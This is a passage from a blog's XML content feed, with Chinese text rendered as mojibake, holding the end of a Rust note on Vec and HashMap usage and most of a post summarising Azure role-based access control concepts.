keyword">mut</span> number_vec<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span>  <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    number_vec<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    number_vec<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> vec_with_macro <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    vec_with_macro<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> _ <span class="token operator">=</span> vec_with_macro<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number_vec :&#123;:?&#125;, vec_with_macro:&#123;:?&#125;"</span><span class="token punctuation">,</span>number_vec<span class="token punctuation">,</span>vec_with_macro<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> è¾“å‡º<span class="token punctuation">:</span>number_vec <span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> vec_with_macro<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span></code></pre><h3 id="HashMap-é”®-å€¼-å¯¹">HashMap é”®/å€¼ å¯¹</h3><p>æ¥è‡ª<code>std::collections</code> æ¨¡å—</p><p>ä½¿ç”¨<code>HashMap::new</code> åˆ›å»º</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> fmap <span class="token operator">=</span> <span class="token class-name">HashMap</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fmap<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fmap<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fmap<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fmap<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token operator">&amp;</span>fmap<span class="token punctuation">&#123;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">" got &#123;&#125;,&#123;&#125;"</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//fmap["a"] = 11;  é”™è¯¯è¯­æ³•</span>fmap<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>fmap<span class="token punctuation">.</span><span class="token function">get_mut</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"fmap[\"a\"] : &#123;&#125;"</span><span class="token punctuation">,</span>fmap<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä¿®æ”¹å†…å®¹æ— æ³•ç›´æ¥ä½¿ç”¨<code>fmap[&quot;a&quot;] = 11; </code> è¿›è¡Œä¿®æ”¹</p><blockquote><p><a href="http://doc.rust-lang.org/std/collections/struct.HashMap.html"><code>HashMap</code></a> does not implement <code>IndexMut</code>, while <a href="http://doc.rust-lang.org/std/vec/struct.Vec.html"><code>Vec</code> does</a>.</p></blockquote><p>ä¿®æ”¹æ–¹æ³•:</p><p>è‹¥fampå­˜åœ¨å…¶å€¼çš„è¯, ç›´æ¥ç”¨insertæ–¹æ³•ä¿®æ”¹</p><p>è‹¥ä¸ç¡®å®šå¯ä»¥ä½¿ç”¨: <code> *fmap.get_mut(&quot;a&quot;).unwrap() = 13;</code> è¿™ç§æ–¹æ³•</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Azure RBAC</title>
      <link href="/posts/e56d5251/"/>
      <url>/posts/e56d5251/</url>
      
        <content type="html"><![CDATA[<h1>Azure RBAC</h1><p><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/overview">https://docs.microsoft.com/zh-cn/azure/role-based-access-control/overview</a></p><p><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/conditions-overview">https://docs.microsoft.com/zh-cn/azure/role-based-access-control/conditions-overview</a></p><p><a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/rbac-and-directory-admin-roles">https://docs.microsoft.com/zh-cn/azure/role-based-access-control/rbac-and-directory-admin-roles</a></p><h2 id="ä»€ä¹ˆæ˜¯-Azure-åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶-Azure-RBAC-ï¼Ÿ">ä»€ä¹ˆæ˜¯ Azure åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (Azure RBAC)ï¼Ÿ</h2><div class="story post-story"><h3 id="Azure-RBAC-æœ‰ä»€ä¹ˆç”¨é€”ï¼Ÿ">Azure RBAC æœ‰ä»€ä¹ˆç”¨é€”ï¼Ÿ</h3><p>ä¸‹é¢æ˜¯ Azure RBAC çš„ç”¨é€”çš„ä¸€äº›ç¤ºä¾‹ï¼š</p><ul><li>è®©ä¸€ä¸ªç”¨æˆ·ç®¡ç†è®¢é˜…ä¸­çš„è™šæ‹Ÿæœºï¼Œå¦ä¸€ä¸ªç”¨æˆ·ç®¡ç†è™šæ‹Ÿç½‘ç»œ</li><li>è®© DBA ç»„ç®¡ç†è®¢é˜…ä¸­çš„ SQL æ•°æ®åº“</li><li>è®©æŸä¸ªç”¨æˆ·ç®¡ç†èµ„æºç»„ä¸­çš„æ‰€æœ‰èµ„æºï¼Œä¾‹å¦‚è™šæ‹Ÿæœºã€ç½‘ç«™å’Œå­ç½‘</li><li>å…è®¸æŸä¸ªåº”ç”¨ç¨‹åºè®¿é—®èµ„æºç»„ä¸­çš„æ‰€æœ‰èµ„æº</li></ul><h3 id="Azure-RBAC-çš„å·¥ä½œåŸç†">Azure RBAC çš„å·¥ä½œåŸç†</h3><p>ä½¿ç”¨ Azure RBAC æ§åˆ¶èµ„æºè®¿é—®æƒé™çš„æ–¹å¼æ˜¯åˆ†é… Azure è§’è‰²ã€‚ è¿™æ˜¯ä¸€ä¸ªéœ€è¦ç†è§£çš„é‡è¦æ¦‚å¿µ â€” å®ƒæ¶‰åŠåˆ°å¦‚ä½•å¼ºåˆ¶å®æ–½æƒé™ã€‚ è§’è‰²åˆ†é…åŒ…å«ä¸‰ä¸ªè¦ç´ ï¼šå®‰å…¨ä¸»ä½“ã€è§’è‰²è®¢é˜…å’ŒèŒƒå›´ã€‚</p><h4 id="å®‰å…¨ä¸»ä½“">å®‰å…¨ä¸»ä½“</h4><p>å®‰å…¨ä¸»ä½“æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºè¯·æ±‚è®¿é—® Azure èµ„æºçš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†ã€‚ å¯ä»¥å°†è§’è‰²åˆ†é…ç»™å…¶ä¸­ä»»ä½•ä¸€ä¸ªå®‰å…¨ä¸»ä½“ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/Zzsgy2vSkBHKlGf.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/Zzsgy2vSkBHKlGf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†è§’è‰²åˆ†é…çš„å®‰å…¨ä¸»ä½“ç±»å‹ã€‚"></p><h4 id="è§’è‰²å®šä¹‰">è§’è‰²å®šä¹‰</h4><p>è§’è‰²å®šä¹‰æ˜¯æƒé™çš„é›†åˆã€‚ å®ƒé€šå¸¸ç›´æ¥ç§°ä¸ºâ€œè§’è‰²â€ã€‚ è§’è‰²å®šä¹‰åˆ—å‡ºå¯æ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚è¯»å–ã€å†™å…¥å’Œåˆ é™¤ã€‚ è§’è‰²å¯ä»¥æ˜¯é«˜çº§åˆ«çš„ï¼ˆä¾‹å¦‚æ‰€æœ‰è€…ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ç‰¹å®šçš„ï¼ˆä¾‹å¦‚è™šæ‹Ÿæœºè¯»å–è€…ï¼‰ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/a9mBYPwnsrd8vyF.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/a9mBYPwnsrd8vyF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†è§’è‰²åˆ†é…çš„è§’è‰²å®šä¹‰ç¤ºä¾‹"></p><p>Azure åŒ…å«å¤šä¸ªå¯ç”¨çš„<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles">å†…ç½®è§’è‰²</a>ã€‚ ä¾‹å¦‚ï¼Œ<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#virtual-machine-contributor">è™šæ‹Ÿæœºå‚ä¸è€…</a>è§’è‰²å…è®¸ç”¨æˆ·åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºã€‚ å¦‚æœå†…ç½®è§’è‰²ä¸èƒ½æ»¡è¶³ç»„ç»‡çš„ç‰¹å®šéœ€æ±‚ï¼Œä½ å¯ä»¥åˆ›å»ºè‡ªå·±çš„ <a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/custom-roles">Azure è‡ªå®šä¹‰è§’è‰²</a>ã€‚</p><h4 id="èŒƒå›´">èŒƒå›´</h4><p>èŒƒå›´æ˜¯è®¿é—®æƒé™é€‚ç”¨äºçš„èµ„æºé›†ã€‚ åˆ†é…è§’è‰²æ—¶ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰èŒƒå›´æ¥è¿›ä¸€æ­¥é™åˆ¶å…è®¸çš„æ“ä½œã€‚ è‹¥è¦å°†æŸäººåˆ†é…ä¸º<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#website-contributor">ç½‘ç«™å‚ä¸è€…</a>ï¼Œä½†åªé’ˆå¯¹ä¸€ä¸ªèµ„æºç»„æ‰§è¡Œæ­¤åˆ†é…ï¼Œåˆ™å¯ä½¿ç”¨èŒƒå›´ã€‚</p><p>åœ¨ Azure ä¸­ï¼Œå¯åœ¨å››ä¸ªçº§åˆ«æŒ‡å®šèŒƒå›´ï¼š<a href="https://docs.microsoft.com/zh-cn/azure/governance/management-groups/overview">ç®¡ç†ç»„</a>ã€è®¢é˜…ã€<a href="https://docs.microsoft.com/zh-cn/azure/azure-resource-manager/management/overview#resource-groups">èµ„æºç»„</a>æˆ–èµ„æºã€‚ èŒƒå›´é‡‡ç”¨çˆ¶å­å…³ç³»ç»“æ„ã€‚ å¯ä»¥åœ¨å…¶ä¸­ä»»ä½•ä¸€ä¸ªèŒƒå›´çº§åˆ«åˆ†é…è§’è‰²ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/t64iDKaNegGSWqB.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/t64iDKaNegGSWqB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†è§’è‰²åˆ†é…çš„èŒƒå›´çº§åˆ«ã€‚"></p><p>æœ‰å…³èŒƒå›´çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/scope-overview">äº†è§£èŒƒå›´</a>ã€‚</p><h3 id="è§’è‰²åˆ†é…">è§’è‰²åˆ†é…</h3><p>è§’è‰²åˆ†é…æ˜¯å‡ºäºæˆäºˆè®¿é—®æƒé™çš„ç›®çš„ï¼Œå°†è§’è‰²å®šä¹‰é™„åŠ åˆ°ç‰¹å®šèŒƒå›´å†…çš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†çš„è¿‡ç¨‹ã€‚ é€šè¿‡åˆ›å»ºè§’è‰²åˆ†é…æ¥æˆäºˆè®¿é—®æƒé™ï¼Œé€šè¿‡åˆ é™¤è§’è‰²åˆ†é…æ¥æ’¤é”€è®¿é—®æƒé™ã€‚</p><p>ä¸‹å›¾æ˜¾ç¤ºäº†è§’è‰²åˆ†é…çš„ç¤ºä¾‹ã€‚ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œä¸ºâ€œè¥é”€â€ç»„åˆ†é…äº†åŒ»è¯é”€å”®èµ„æºç»„çš„<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/built-in-roles#contributor">å‚ä¸è€…</a>è§’è‰²ã€‚ è¿™æ„å‘³ç€ï¼Œâ€œè¥é”€â€ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥åœ¨åŒ»è¯é”€å”®èµ„æºç»„ä¸­åˆ›å»ºæˆ–ç®¡ç†ä»»ä½• Azure èµ„æºã€‚ â€œè¥é”€â€ç”¨æˆ·æ— æƒè®¿é—®åŒ»è¯é”€å”®èµ„æºç»„å¤–éƒ¨çš„èµ„æºï¼Œé™¤éä»–ä»¬å±äºå¦ä¸€ä¸ªè§’è‰²åˆ†é…ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/zKc3xoeCI4ENTF8.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/zKc3xoeCI4ENTF8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†å®‰å…¨ä¸»ä½“ã€è§’è‰²å®šä¹‰å’ŒèŒƒå›´å¦‚ä½•åˆ›å»ºè§’è‰²åˆ†é…ã€‚"></p><p>å¯ä½¿ç”¨ Azure é—¨æˆ·ã€Azure CLIã€Azure PowerShellã€Azure SDK æˆ– REST API åˆ†é…è§’è‰²ã€‚</p><p>æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/role-assignments-steps">åˆ†é… Azure è§’è‰²çš„æ­¥éª¤</a>ã€‚</p><h3 id="ç»„">ç»„</h3><p>è§’è‰²åˆ†é…å¯¹ç»„æ¥è¯´æ˜¯å¯ä¼ é€’çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœæŸç”¨æˆ·æ˜¯æŸä¸ªç»„çš„æˆå‘˜ï¼Œè€Œè¯¥ç»„å±äºå…·æœ‰è§’è‰²åˆ†é…çš„å¦ä¸€ä¸ªç»„ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å°†å…·æœ‰è¯¥è§’è‰²åˆ†é…ä¸­çš„æƒé™ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/u4xbEgJsIq5WOeG.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/u4xbEgJsIq5WOeG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†ç»„çš„è§’è‰²åˆ†é…æ˜¯å¦‚ä½•ä¼ é€’çš„ã€‚"></p><h3 id="å¤šè§’è‰²åˆ†é…">å¤šè§’è‰²åˆ†é…</h3><p>å¦‚æœæœ‰å¤šä¸ªé‡å çš„è§’è‰²åˆ†é…ï¼Œå°†ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ Azure RBAC æ˜¯ä¸€ä¸ªåŠ æ³•æ¨¡å‹ï¼Œå› æ­¤æœ‰æ•ˆæƒé™æ˜¯è§’è‰²åˆ†é…çš„æ€»å’Œã€‚ è¯·è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œå…¶ä¸­åœ¨è®¢é˜…èŒƒå›´å†…å‘ç”¨æˆ·æˆäºˆäº†â€œå‚ä¸è€…â€è§’è‰²ï¼Œå¹¶ä¸”æˆäºˆäº†å¯¹èµ„æºç»„çš„â€œè¯»è€…â€è§’è‰²ã€‚ â€œå‚ä¸è€…â€æƒé™ä¸â€œè¯»è€…â€æƒé™çš„æ€»å’Œå®é™…ä¸Šæ˜¯è®¢é˜…çš„â€œå‚ä¸è€…â€è§’è‰²ã€‚ å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œâ€œè¯»è€…â€è§’è‰²åˆ†é…æ²¡æœ‰ä»»ä½•å½±å“ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/N4l2ySpm6iTBI5t.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/N4l2ySpm6iTBI5t.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç¤ºæ„å›¾æ˜¾ç¤ºäº†å¤šä¸ªè§’è‰²åˆ†é…å¦‚ä½•é‡å ã€‚"></p><h3 id="æ‹’ç»åˆ†é…">æ‹’ç»åˆ†é…</h3><p>ä»¥å‰ï¼ŒAzure RBAC æ˜¯ä¸€ç§åªèƒ½æ‰§è¡Œå…è®¸æ“ä½œçš„æ¨¡å‹ï¼Œæ²¡æœ‰æ‹’ç»åŠŸèƒ½ï¼Œä½† Azure RBAC ç°åœ¨ä»¥æœ‰é™æ–¹å¼æ”¯æŒæ‹’ç»åˆ†é…ã€‚ <em>æ‹’ç»åˆ†é…</em>ç±»ä¼¼äºè§’è‰²åˆ†é…ï¼Œå¯å°†ä¸€ç»„æ‹’ç»æ“ä½œé™„åŠ åˆ°ç‰¹å®šèŒƒå›´å†…çš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†ï¼Œä»¥ä¾¿æ‹’ç»è®¿é—®ã€‚ è§’è‰²åˆ†é…å®šä¹‰äº†ä¸€ç»„å…è®¸çš„æ“ä½œï¼Œè€Œæ‹’ç»åˆ†é…å®šä¹‰äº†ä¸€ç»„ä¸å…è®¸çš„æ“ä½œã€‚ æ¢è€Œè¨€ä¹‹ï¼Œå³ä½¿è§’è‰²åˆ†é…æˆäºˆç”¨æˆ·è®¿é—®æƒé™ï¼Œæ‹’ç»åˆ†é…ä¹Ÿä¼šé˜»æ­¢ç”¨æˆ·æ‰§è¡ŒæŒ‡å®šçš„æ“ä½œã€‚ æ‹’ç»åˆ†é…ä¼˜å…ˆäºè§’è‰²åˆ†é…ã€‚</p><p>æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://docs.microsoft.com/zh-cn/azure/role-based-access-control/deny-assignments">äº†è§£ Azure æ‹’ç»åˆ†é…</a>ã€‚</p><h3 id="Azure-RBAC-å¦‚ä½•ç¡®å®šç”¨æˆ·æ˜¯å¦æœ‰æƒè®¿é—®èµ„æº">Azure RBAC å¦‚ä½•ç¡®å®šç”¨æˆ·æ˜¯å¦æœ‰æƒè®¿é—®èµ„æº</h3><p>ä¸‹é¢æ˜¯ Azure RBAC ç”¨äºç¡®å®šä½ æ˜¯å¦å¯è®¿é—®èµ„æºçš„æ¦‚è¦æ­¥éª¤ã€‚ è¿™äº›æ­¥éª¤é€‚ç”¨äºä¸ Azure RBAC é›†æˆçš„ Azure èµ„æºç®¡ç†å™¨æˆ–æ•°æ®å¹³é¢æœåŠ¡ã€‚ å¦‚æœæ­£åœ¨å°è¯•å¯¹è®¿é—®é—®é¢˜è¿›è¡Œæ•…éšœæ’é™¤ï¼Œè¿™æœ‰åŠ©äºäº†è§£é—®é¢˜ã€‚</p><ol><li><p>ç”¨æˆ·ï¼ˆæˆ–æœåŠ¡ä¸»ä½“ï¼‰è·å– Azure èµ„æºç®¡ç†å™¨çš„ä»¤ç‰Œã€‚</p><p>ä»¤ç‰ŒåŒ…å«ç”¨æˆ·çš„ç»„æˆå‘˜èº«ä»½ï¼ˆåŒ…æ‹¬å¯ä¼ é€’çš„ç»„æˆå‘˜èº«ä»½ï¼‰ã€‚</p></li><li><p>ç”¨æˆ·ä½¿ç”¨é™„åŠ çš„ä»¤ç‰Œå¯¹ Azure èµ„æºç®¡ç†å™¨å‘å‡º REST API è°ƒç”¨ã€‚</p></li><li><p>Azure èµ„æºç®¡ç†å™¨æ£€ç´¢é€‚ç”¨äºå¯¹å…¶æ‰§è¡Œæ“ä½œçš„èµ„æºçš„æ‰€æœ‰è§’è‰²åˆ†é…å’Œæ‹’ç»åˆ†é…ã€‚</p></li><li><p>å¦‚æœæ‹’ç»åˆ†é…é€‚ç”¨ï¼Œåˆ™é˜»æ­¢è®¿é—®ã€‚ å¦åˆ™ï¼Œè¯„ä¼°å°†ç»§ç»­è¿›è¡Œã€‚</p></li><li><p>Azure èµ„æºç®¡ç†å™¨ç¼©å°é€‚ç”¨äºæ­¤ç”¨æˆ·æˆ–å…¶ç»„çš„è§’è‰²åˆ†é…èŒƒå›´ï¼Œå¹¶ç¡®å®šç”¨æˆ·é’ˆå¯¹æ­¤èµ„æºæ‹¥æœ‰çš„è§’è‰²ã€‚</p></li><li><p>Azure èµ„æºç®¡ç†å™¨ç¡®å®š API è°ƒç”¨ä¸­çš„æ“ä½œæ˜¯å¦åŒ…å«åœ¨ç”¨æˆ·é’ˆå¯¹æ­¤èµ„æºæ‹¥æœ‰çš„è§’è‰²ä¸­ã€‚ å¦‚æœè§’è‰²åŒ…å«çš„ <code>Actions</code> å…·æœ‰é€šé…ç¬¦ (<code>*</code>)ï¼Œåˆ™é€šè¿‡ä»å…è®¸çš„ <code>Actions</code> ä¸­å‡å» <code>NotActions</code> æ¥è®¡ç®—æœ‰æ•ˆæƒé™ã€‚ åŒæ ·ï¼Œå¯¹ä»»ä½•æ•°æ®æ“ä½œæ‰§è¡Œç›¸åŒçš„å‡æ³•è¿ç®—ã€‚</p><p><code>Actions - NotActions = Effective management permissions</code></p><p><code>DataActions - NotDataActions = Effective data permissions</code></p></li><li><p>å¦‚æœç”¨æˆ·åœ¨è¯·æ±‚çš„èŒƒå›´å†…æ²¡æœ‰åŒ…å«è¯¥æ“ä½œçš„è§’è‰²ï¼Œåˆ™ä¸å…è®¸è®¿é—®ã€‚ å¦åˆ™ï¼Œå°†è¯„ä¼°ä»»ä½•æ¡ä»¶ã€‚</p></li><li><p>å¦‚æœè§’è‰²åˆ†é…åŒ…å«æ¡ä»¶ï¼Œåˆ™å¯¹è¿™äº›æ¡ä»¶è¿›è¡Œè¯„ä¼°ã€‚ å¦åˆ™å°†å…è®¸è®¿é—®ã€‚</p></li><li><p>å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™å…è®¸è®¿é—®ã€‚ å¦åˆ™å°†ä¸å…è®¸è®¿é—®ã€‚</p></li></ol><p>ä¸‹å›¾æ˜¯è¯„ä¼°é€»è¾‘çš„æ‘˜è¦ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/h7NeEXWQfGIDTcU.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/h7NeEXWQfGIDTcU.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="è¯„ä¼°é€»è¾‘æµç¨‹å›¾ï¼Œç”¨äºç¡®å®šå¯¹èµ„æºçš„è®¿é—®æƒé™ã€‚"></p><h3 id="ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€Azure-è§’è‰²å’Œ-Azure-AD-è§’è‰²">ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€Azure è§’è‰²å’Œ Azure AD è§’è‰²</h3><ul><li>ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²</li><li>Azure è§’è‰²</li><li>Azure Active Directory (Azure AD) è§’è‰²</li></ul><h3 id="è§’è‰²ä¹‹é—´çš„ç›¸äº’å…³ç³»">è§’è‰²ä¹‹é—´çš„ç›¸äº’å…³ç³»</h3><p>è‹¥è¦æ›´å¥½åœ°ç†è§£ Azure ä¸­çš„è§’è‰²ï¼Œæœ€å¥½æ˜¯å…ˆäº†è§£ä¸€äº›å†å²ä¿¡æ¯ã€‚ Azure æœ€åˆå‘å¸ƒæ—¶ï¼Œå¯¹èµ„æºçš„è®¿é—®æƒé™åªæ˜¯é€šè¿‡ä»¥ä¸‹ä¸‰ç§ç®¡ç†å‘˜è§’è‰²è¿›è¡Œç®¡ç†ï¼š<font color='orange'>å¸æˆ·ç®¡ç†å‘˜ã€æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜</font>ã€‚ åæ¥æ·»åŠ äº† Azure åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (Azure RBAC)ã€‚ Azure RBAC æ˜¯ä¸€ä¸ªè¾ƒæ–°çš„æˆæƒç³»ç»Ÿï¼Œå®ƒé’ˆå¯¹ Azure èµ„æºæä¾›ç²¾ç»†çš„è®¿é—®ç®¡ç†ã€‚ Azure RBAC åŒ…æ‹¬è®¸å¤šå†…ç½®è§’è‰²ï¼Œå¯åœ¨ä¸åŒçš„èŒƒå›´è¿›è¡Œåˆ†é…ï¼Œå¹¶å…è®¸ä½ åˆ›å»ºè‡ªå·±çš„è‡ªå®šä¹‰è§’è‰²ã€‚ è‹¥è¦ç®¡ç† Azure AD ä¸­çš„èµ„æºï¼ˆä¾‹å¦‚ç”¨æˆ·ã€ç»„å’ŒåŸŸï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å¤šç§ Azure AD è§’è‰²ã€‚</p><p>ä¸‹å›¾ä»è¾ƒé«˜çš„å±‚é¢æ˜¾ç¤ºäº†ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€Azure è§’è‰²ä¸ Azure AD è§’è‰²ä¹‹é—´çš„ç›¸äº’å…³ç³»ã€‚</p><p><img src="https://s2.loli.net/2021/12/22/58GSCoEyrthcwKk.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/22/58GSCoEyrthcwKk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Azure ä¸­çš„ä¸åŒè§’è‰²"></p><h3 id="ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²">ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²</h3><p><font color='orange'>å¸æˆ·ç®¡ç†å‘˜ã€æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜æ˜¯ Azure ä¸­çš„ä¸‰ç§ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²</font>ã€‚ <font color='brown'>ç»å…¸è®¢é˜…ç®¡ç†å‘˜å¯¹ Azure è®¢é˜…æ‹¥æœ‰å®Œå…¨è®¿é—®æƒé™ã€‚ ä»–ä»¬å¯ä»¥ä½¿ç”¨ Azure é—¨æˆ·ã€Azure èµ„æºç®¡ç†å™¨ API å’Œç»å…¸éƒ¨ç½²æ¨¡å‹ API æ¥ç®¡ç†èµ„æºã€‚</font> ç”¨äºæ³¨å†Œ Azure 